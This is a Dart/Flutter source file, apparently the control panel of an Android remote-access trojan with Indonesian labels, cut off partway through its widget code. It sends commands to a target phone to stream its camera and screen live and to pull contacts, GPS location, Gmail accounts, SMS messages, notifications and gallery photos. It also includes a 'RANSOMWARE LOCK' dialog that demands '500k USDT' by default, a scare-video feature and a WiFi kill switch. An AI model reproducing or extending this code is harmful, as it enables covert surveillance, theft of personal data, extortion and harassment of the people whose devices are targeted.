import 'dart:async';
import 'dart:ui' as ui;
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'color_theme.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'package:xxo25/config.dart';  
// Import dari dashboard
import 'dashboard_page.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;

  const ControlCenterPage({
    super.key,
    this.targetDevice,
    this.role = 'owner',
  });

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage>
    with SingleTickerProviderStateMixin {

  // ─── WARNA ──────────────────────────────────────────────
  Color get _roleColor => AppColors.silver;
  Color get _bgColor => AppColors.bg;
  Color get _surfaceColor => AppColors.surface;
  Color get _surface2Color => AppColors.surface2;
  Color get _textPrimary => AppColors.textPrimary;
  Color get _textSecondary => AppColors.textSec;
  Color get _textMuted => AppColors.textMuted;
  Color get _borderColor => AppColors.border;

  // ─── VARIABLES ───────────────────────────────────────────
  final List<String> _log = [];
  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Toggles
  bool _strobeOn = false;
  bool _vibrateOn = false;
  bool _killWifiOn = false;
  bool _stopAudioOn = false;
  bool _stopLiveOn = false;

  // Chat
  Timer? _chatTimer;

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  // ─── INIT ─────────────────────────────────────────────────
  @override
  void initState() {
    super.initState();
    AppThemeController.instance.addListener(_onThemeChanged);
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override

  void _onThemeChanged() => mounted ? setState(() {}) : null;
  void dispose() {
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _frameN.dispose();
    AppThemeController.instance.removeListener(_onThemeChanged);
    super.dispose();
  }

  // ─── COMMANDS ─────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') return;
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));
      if (res.statusCode == 200 && !silent) {
        _addLog('✅ Sent: $cmd');
      }
    } catch (e) {
      if (!silent) _addLog('❌ Error: $e');
    }
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}] $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  // ─── LIVE ──────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'FRONT CAM' : 'BACK CAM')
          : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 100), (_) async {
      if (!_liveOn || !mounted) return;
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200 && res.body.isNotEmpty) {
          final data = jsonDecode(res.body);
          final raw = data['frame']?.toString() ?? '';
          if (raw.isNotEmpty) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    setState(() {
      _liveOn = false;
      _stopLiveOn = false;
    });
    _cmd('live_stop', silent: true);
  }

  // ─── CHAT ──────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    http.post(
      Uri.parse('$_kBase/api/lock-chat/$_id'),
      body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      headers: {'Content-Type': 'application/json'},
    );
  }

  // ─── DIALOGS ───────────────────────────────────────────────
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, setState) => AlertDialog(
          backgroundColor: _surfaceColor,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: _borderColor.withOpacity(0.5)),
          ),
          title: const Text('Select Camera', style: TextStyle(color: Colors.white)),
          content: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: [
              _buildCamOption('back', 'Back', sel == 'back',
                  () => setState(() => sel = 'back')),
              _buildCamOption('front', 'Front', sel == 'front',
                  () => setState(() => sel = 'front')),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
              style: ElevatedButton.styleFrom(backgroundColor: _roleColor),
              child: const Text('Select', style: TextStyle(color: Colors.black)),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCamOption(String value, String label, bool isSelected, VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
        decoration: BoxDecoration(
          color: isSelected ? _roleColor.withOpacity(0.2) : Colors.transparent,
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: isSelected ? _roleColor : Colors.grey),
        ),
        child: Column(
          children: [
            Icon(
              value == 'back' ? Icons.camera_rear : Icons.camera_front,
              color: isSelected ? _roleColor : Colors.grey,
            ),
            const SizedBox(height: 5),
            Text(
              label,
              style: TextStyle(color: isSelected ? _roleColor : Colors.grey),
            ),
          ],
        ),
      ),
    );
  }

  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(20),
            color: _surfaceColor.withOpacity(0.95),
            border: Border.all(color: _borderColor.withOpacity(0.5)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(12),
                child: Row(
                  children: [
                    const Icon(Icons.circle, color: Colors.red, size: 10),
                    const SizedBox(width: 8),
                    Text(
                      'LIVE - $_liveTitle',
                      style: const TextStyle(color: Colors.white),
                    ),
                    const Spacer(),
                    Text(
                      '$_fps fps',
                      style: const TextStyle(color: Colors.green),
                    ),
                  ],
                ),
              ),
              _frame != null
                  ? Image.memory(_frame!, height: 300, fit: BoxFit.contain)
                  : const SizedBox(
                      height: 200,
                      child: Center(child: CircularProgressIndicator()),
                    ),
              Padding(
                padding: const EdgeInsets.all(12),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                  children: [
                    ElevatedButton(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.red,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                      onPressed: () {
                        _stopLive();
                        Navigator.pop(context);
                      },
                      child: const Text('⏹ STOP', style: TextStyle(color: Colors.white)),
                    ),
                    ElevatedButton(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _roleColor,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                      onPressed: () {
                        _cmd('take_photo', extra: 'back');
                      },
                      child: const Text('📷 SNAP', style: TextStyle(color: Colors.black)),
                    ),
                    ElevatedButton(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _roleColor.withOpacity(0.3),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                      onPressed: () {
                        Navigator.pop(context);
                        _showCamPicker((side) {
                          _startLive('live_camera_start', side);
                          _showLiveDialog();
                        });
                      },
                      child: const Text('🔄 SWITCH', style: TextStyle(color: Colors.white)),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showRansomwareDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    final ownerCtrl = TextEditingController(text: widget.role.toUpperCase());

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: Colors.red.withOpacity(0.5), width: 2),
        ),
        title: Row(
          children: [
            const Icon(Icons.warning_rounded, color: Colors.red, size: 28),
            const SizedBox(width: 8),
            const Text('💀 RANSOMWARE LOCK',
                style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
          ],
        ),
        content: SizedBox(
          width: 300,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.red.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.red.withOpacity(0.3)),
                ),
                child: Column(
                  children: [
                    const Icon(Icons.warning, color: Colors.red, size: 40),
                    const SizedBox(height: 8),
                    const Text(
                      '⚠️ DEVICE LOCKED!',
                      style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: msgCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  hintText: 'Pesan ancaman',
                  hintStyle: TextStyle(color: Colors.grey),
                  labelText: 'Pesan',
                  labelStyle: TextStyle(color: Colors.grey),
                ),
              ),
              const SizedBox(height: 8),
              TextField(
                controller: pinCtrl,
                style: const TextStyle(color: Colors.white),
                keyboardType: TextInputType.number,
                decoration: const InputDecoration(
                  hintText: '4 digit PIN',
                  hintStyle: TextStyle(color: Colors.grey),
                  labelText: 'PIN Unlock',
                  labelStyle: TextStyle(color: Colors.grey),
                ),
              ),
              const SizedBox(height: 8),
              TextField(
                controller: ownerCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  hintText: 'Nama pengunci',
                  hintStyle: TextStyle(color: Colors.grey),
                  labelText: 'Owner Name',
                  labelStyle: TextStyle(color: Colors.grey),
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.red,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.isNotEmpty ? msgCtrl.text : 'DEVICE LOCKED! Bayar 500k USDT!';
              final pin = pinCtrl.text.isNotEmpty ? pinCtrl.text : '1234';
              final owner = ownerCtrl.text.isNotEmpty ? ownerCtrl.text : 'ZYRAXX';
              _cmd('ransomware_lock', extra: '$msg|$pin|$owner');
              _addLog('💀 Ransomware terkirim! PIN: $pin');

              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(
                  content: Text('💀 Ransomware terkirim ke target!'),
                  backgroundColor: Colors.red,
                  duration: Duration(seconds: 3),
                ),
              );
            },
            child: const Text('💀 SEND RANSOMWARE',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showScareVideoDialog() {
    final urlCtrl = TextEditingController(
        text: 'https://files.catbox.moe/2cpiro.mp4');

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: Colors.red.withOpacity(0.5), width: 2),
        ),
        title: Row(
          children: [
            const Icon(Icons.movie_rounded, color: Colors.red, size: 28),
            const SizedBox(width: 8),
            const Text('🎬 SCARE VIDEO',
                style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
          ],
        ),
        content: SizedBox(
          width: 300,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.red.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.red.withOpacity(0.3)),
                ),
                child: const Row(
                  children: [
                    Icon(Icons.video_library, color: Colors.red, size: 30),
                    SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        'Video akan diputar fullscreen di target!',
                        style: TextStyle(color: Colors.white),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: urlCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  hintText: 'URL MP4',
                  hintStyle: TextStyle(color: Colors.grey),
                  labelText: 'Video URL',
                  labelStyle: TextStyle(color: Colors.grey),
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.red,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              final url = urlCtrl.text.isNotEmpty ? urlCtrl.text : 'https://files.catbox.moe/2cpiro.mp4';
              _cmd('play_scare_video', extra: url);
              _addLog('🎬 Scare video terkirim');

              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(
                  content: Text('🎬 Scare video terkirim ke target!'),
                  backgroundColor: Colors.red,
                  duration: Duration(seconds: 3),
                ),
              );
            },
            child: const Text('🎬 SEND SCARE VIDEO',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String hint, Function(String) onDone,
      {bool isNumber = false}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _borderColor.withOpacity(0.5)),
        ),
        title: Text(title, style: const TextStyle(color: Colors.white)),
        content: TextField(
          controller: ctrl,
          keyboardType: isNumber ? TextInputType.number : TextInputType.text,
          style: const TextStyle(color: Colors.white),
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: const TextStyle(color: Colors.grey),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              onDone(ctrl.text);
            },
            style: ElevatedButton.styleFrom(backgroundColor: _roleColor),
            child: const Text('Send', style: TextStyle(color: Colors.black)),
          ),
        ],
      ),
    );
  }

  void _showLockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _borderColor.withOpacity(0.5)),
        ),
        title: const Text('🔒 Lock Live + Chat',
            style: TextStyle(color: Colors.white)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: msgCtrl,
              style: const TextStyle(color: Colors.white),
              decoration: const InputDecoration(
                hintText: 'Message',
                hintStyle: TextStyle(color: Colors.grey),
              ),
            ),
            const SizedBox(height: 10),
            TextField(
              controller: pinCtrl,
              style: const TextStyle(color: Colors.white),
              keyboardType: TextInputType.number,
              decoration: const InputDecoration(
                hintText: 'PIN',
                hintStyle: TextStyle(color: Colors.grey),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _cmd('lock_live', extra: '${msgCtrl.text}|${pinCtrl.text}');
              _addLog('🔒 Lock Live sent');
            },
            style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
            child: const Text('🔒 LOCK', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  void _showHtmlLockDialog() {
    final pinCtrl = TextEditingController();
    final htmlCtrl = TextEditingController();
    htmlCtrl.text =
        '<h1>DEVICE LOCKED</h1><input type="password" id="pin" placeholder="PIN"><button onclick="unlock()">UNLOCK</button><script>function unlock(){var pin=document.getElementById("pin").value;if(pin)location.href="unlock://"+pin;}</script>';

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _borderColor.withOpacity(0.5)),
        ),
        title: const Text('🔐 HTML Lock',
            style: TextStyle(color: Colors.white)),
        content: SizedBox(
          width: 300,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                controller: pinCtrl,
                style: const TextStyle(color: Colors.white),
                keyboardType: TextInputType.number,
                decoration: const InputDecoration(
                  hintText: 'PIN',
                  hintStyle: TextStyle(color: Colors.grey),
                ),
              ),
              const SizedBox(height: 10),
              Container(
                height: 150,
                child: TextField(
                  controller: htmlCtrl,
                  maxLines: null,
                  expands: true,
                  style: const TextStyle(color: Colors.white),
                  decoration: const InputDecoration(
                    hintText: 'HTML Code',
                    hintStyle: TextStyle(color: Colors.grey),
                    border: OutlineInputBorder(),
                  ),
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              String encoded = base64.encode(utf8.encode(htmlCtrl.text));
              _cmd('lock_with_html', extra: '$encoded|${pinCtrl.text}');
              _addLog('🔐 HTML Lock sent');
            },
            style: ElevatedButton.styleFrom(backgroundColor: _roleColor),
            child: const Text('SEND', style: TextStyle(color: Colors.black)),
          ),
        ],
      ),
    );
  }

  void _showRestartDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _borderColor.withOpacity(0.5)),
        ),
        title: const Text('🔄 Restart Device',
            style: TextStyle(color: Colors.white)),
        content: const Text(
          'Device akan restart. Lanjutkan?',
          style: TextStyle(color: Colors.grey),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _cmd('reboot_device');
              _addLog('🔄 Restart command sent');
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.orange,
            ),
            child: const Text('🔄 RESTART', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  // ─── BUILD ─────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgColor,
      appBar: _buildAppBar(),
      body: Column(
        children: [
          _buildLogArea(),
          Expanded(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(12),
              physics: const BouncingScrollPhysics(),
              child: Column(
                children: [
                  // ─── LIVE SECTION ────────────────────────
                  _buildSectionTitle('🎥 LIVE'),
                  _buildTwoCards([
                    _buildNavCard('📹', 'LIVE CAMERA', 'Front • Back',
                        () => _showCamPicker((side) {
                              _startLive('live_camera_start', side);
                              _showLiveDialog();
                            })),
                    _buildNavCard('🖥️', 'LIVE SCREEN', 'Share screen live',
                        () => _startLive('live_screen_start', '')),
                  ]),
                  _buildTwoCards([
                    _buildToggleCard('⏹', 'STOP LIVE', _stopLiveOn,
                        (val) {
                          setState(() => _stopLiveOn = val);
                          if (val) _stopLive();
                        }),
                    _buildNavCard('📊', 'LIVE STATUS', 'FPS: 24 • 1280x720',
                        () => _showLiveDialog()),
                  ]),

                  const SizedBox(height: 16),

                  // ─── CAMERA SECTION ───────────────────────
                  _buildSectionTitle('📷 CAMERA'),
                  _buildTwoCards([
                    _buildNavCard('📷', 'CAMERA', 'Front • Back',
                        () => _showCamPicker((side) => _cmd('take_photo', extra: side))),
                    _buildNavCard('🖥️', 'SCREENSHOT', 'Capture screen',
                        () => _cmd('get_screen')),
                  ]),
                  _buildTwoCards([
                    _buildNavCard('🖼️', 'WALLPAPER', 'Set image URL',
                        () => _showInputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))),
                    _buildToggleCard('⚡', 'STROBE', _strobeOn, (val) {
                      setState(() => _strobeOn = val);
                      if (val) _cmd('flash_strobe');
                      else _cmd('stop_strobe');
                    }),
                  ]),

                  const SizedBox(height: 16),

                  // ─── INTEL SECTION ────────────────────────
                  _buildSectionTitle('🕵️ INTEL'),
                  _buildTwoCards([
                    _buildNavCard('👤', 'CONTACTS', 'Get all contacts',
                        () => _cmd('get_contacts')),
                    _buildNavCard('📍', 'GPS', 'Get GPS coordinates',
                        () => _cmd('get_location')),
                  ]),
                  _buildTwoCards([
                    _buildNavCard('📧', 'GMAIL', 'Get Gmail accounts',
                        () => _cmd('get_gmails')),
                    _buildNavCard('💬', 'SMS', 'Get SMS messages',
                        () => _cmd('get_sms')),
                  ]),
                  _buildTwoCards([
                    _buildNavCard('🔔', 'NOTIFICATIONS', 'Get notifications',
                        () => _cmd('get_notifications')),
                    _buildNavCard('🖼️', 'GALLERY', 'Get 5 latest photos',
                        () => _cmd('get_gallery', extra: '5')),
                  ]),

                  const SizedBox(height: 16),

                  // ─── AUDIO SECTION ────────────────────────
                  _buildSectionTitle('🔊 AUDIO'),
                  _buildTwoCards([
                    _buildNavCard('▶️', 'PLAY AUDIO', 'Play MP3 from URL',
                        () => _showInputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
                    _buildToggleCard('⏹', 'STOP AUDIO', _stopAudioOn, (val) {
                      setState(() => _stopAudioOn = val);
                      if (val) _cmd('stop_audio');
                    }),
                  ]),
                  _buildTwoCards([
                    _buildToggleCard('📳', 'VIBRATE', _vibrateOn, (val) {
                      setState(() => _vibrateOn = val);
                      if (val) _cmd('vibrate_loop');
                      else _cmd('stop_vibrate');
                    }),
                    _buildNavCard('🌐', 'OPEN URL', 'Open URL in browser',
                        () => _showInputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))),
                  ]),
                  _buildTwoCards([
                    _buildToggleCard('📶', 'KILL WIFI', _killWifiOn, (val) {
                      setState(() => _killWifiOn = val);
                      if (val) _cmd('kill_wifi');
                      else _cmd('restore_wifi');
                    }),
                    _buildNavCard('🔊', 'VOLUME UP', 'Max volume',
                        () => _cmd('max_volume')),
                  ]),

                  const SizedBox(height: 16),

                  // ─── LOCK SECTION ─────────────────────────
                  _buildSectionTitle('🔒 LOCK'),
                  _buildTwoCards([
                    _buildNavCard('🔒', 'LOCK LIVE', 'Lock + Chat in realtime',
                        _showLockLiveDialog),
                    _buildNavCard('🔐', 'LOCK DEVICE', 'Lock with message+Pin',
                        () => _showInputDialog('Lock Device', 'Message|PIN', (v) {
                              final parts = v.split('|');
                              _cmd('hard_lock', extra: '${parts[0]}|${parts[1]}');
                            })),
                  ]),
                  _buildTwoCards([
                    _buildNavCard('🔓', 'UNLOCK', 'Unlock device',
                        () => _cmd('unlock')),
                    _buildNavCard('🔐', 'HTML LOCK', 'Lock with custom HTML',
                        _showHtmlLockDialog),
                  ]),
                  _buildTwoCards([
                    _buildNavCard('💀', 'RANSOMWARE', '🔴 TOTAL LOCK + PIN',
                        _showRansomwareDialog),
                    _buildNavCard('🎬', 'SCARE VIDEO', '🔴 Play scary video',
                        _showScareVideoDialog),
                  ]),

                  // ─── CHAT FULL WIDTH ──────────────────────
                  const SizedBox(height: 8),
                  _buildChatCard(),

                  const SizedBox(height: 16),

                  // ─── DEVICE SECTION ───────────────────────
                  _buildSectionTitle('📱 DEVICE'),
                  _buildTwoCards([
                    _buildNavCard('🔄', 'RESTART', 'Reboot device',
                        _showRestartDialog),
                    _buildNavCard('☀️', 'WAKE UP', 'Wake up screen',
                        () => _cmd('force_open')),
                  ]),
                  _buildTwoCards([
                    _buildNavCard('📱', 'DEVICE INFO', 'Get device info',
                        () => _cmd('get_device_info')),
                    _buildNavCard('🔋', 'BATTERY', 'Get battery status',
                        () => _cmd('get_battery')),
                  ]),

                  const SizedBox(height: 30),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── APP BAR ───────────────────────────────────────────────
  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: _surfaceColor,
      elevation: 0,
      leading: IconButton(
        icon: Icon(Icons.arrow_back_ios_rounded, color: _roleColor, size: 20),
        onPressed: () => Navigator.pop(context),
      ),
      title: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.control_point_rounded,
                  color: AppColors.silver, size: 16),
              const SizedBox(width: 6),
              const Text(
                'CONTROL CENTER',
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                  letterSpacing: 1,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: AppColors.green.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: AppColors.green.withOpacity(0.3)),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: const BoxDecoration(
                        color: AppColors.green,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 4),
                    const Text(
                      'ONLINE',
                      style: TextStyle(
                        color: AppColors.green,
                        fontSize: 8,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 6),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(
                  color: _surface2Color,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Row(
                  children: [
                    const Icon(Icons.battery_charging_full,
                        color: AppColors.silver, size: 12),
                    const SizedBox(width: 2),
                    Text(
                      '$_battery%',
                      style: const TextStyle(
                        color: AppColors.textSec,
                        fontSize: 9,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          Row(
            children: [
              Icon(Icons.smartphone_rounded,
                  color: _roleColor.withOpacity(0.5), size: 12),
              const SizedBox(width: 4),
              Text(
                '$_model',
                style: TextStyle(
                  color: _textMuted,
                  fontSize: 10,
                  fontFamily: 'ShareTechMono',
                ),
              ),
              const SizedBox(width: 8),
              Container(
                width: 4,
                height: 4,
                decoration: const BoxDecoration(
                  color: AppColors.textMuted,
                  shape: BoxShape.circle,
                ),
              ),
              const SizedBox(width: 8),
              Text(
                'ID: ${_id.length > 10 ? _id.substring(0, 10) + '...' : _id}',
                style: TextStyle(
                  color: _textMuted.withOpacity(0.5),
                  fontSize: 9,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ],
          ),
        ],
      ),
      centerTitle: false,
      bottom: PreferredSize(
        preferredSize: const Size.fromHeight(1),
        child: Container(
          height: 1,
          color: _borderColor.withOpacity(0.3),
        ),
      ),
    );
  }

  // ─── LOG AREA ──────────────────────────────────────────────
  Widget _buildLogArea() {
    return Container(
      height: 32,
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      padding: const EdgeInsets.symmetric(horizontal: 10),
      decoration: BoxDecoration(
        color: _surfaceColor.withOpacity(0.5),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: _borderColor.withOpacity(0.3)),
      ),
      child: _log.isEmpty
          ? const Center(
              child: Text(
                'No activity',
                style: TextStyle(color: Color(0xFF707080), fontSize: 10),
              ),
            )
          : ListView.builder(
              scrollDirection: Axis.horizontal,
              itemCount: _log.length,
              itemBuilder: (_, i) => Padding(
                padding: const EdgeInsets.only(right: 16),
                child: Text(
                  _log[i],
                  style: const TextStyle(
                    color: Color(0xFFB0B0C0),
                    fontSize: 10,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ),
            ),
    );
  }

  // ─── SECTION TITLE ─────────────────────────────────────────
  Widget _buildSectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 8),
      child: Row(
        children: [
          Container(
